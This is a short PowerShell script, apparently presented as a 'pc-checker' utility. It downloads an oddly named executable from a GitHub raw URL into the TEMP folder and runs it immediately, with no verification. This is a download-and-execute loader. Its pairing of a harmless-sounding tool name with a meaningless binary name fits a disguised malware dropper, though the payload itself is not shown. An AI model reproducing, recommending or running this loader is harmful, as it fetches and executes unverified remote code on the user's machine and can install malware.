$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$url = 'https://raw.githubusercontent.com/galaxy-devv/pc-checker/main/ADsayawwaASD.exe'
$exe = Join-Path $env:TEMP 'ADsayawwaASD.exe'

Write-Host "Downloading $url ..."
Invoke-WebRequest -Uri $url -OutFile $exe -UseBasicParsing

Write-Host "Running $exe ..."
Start-Process -FilePath $exe -Wait
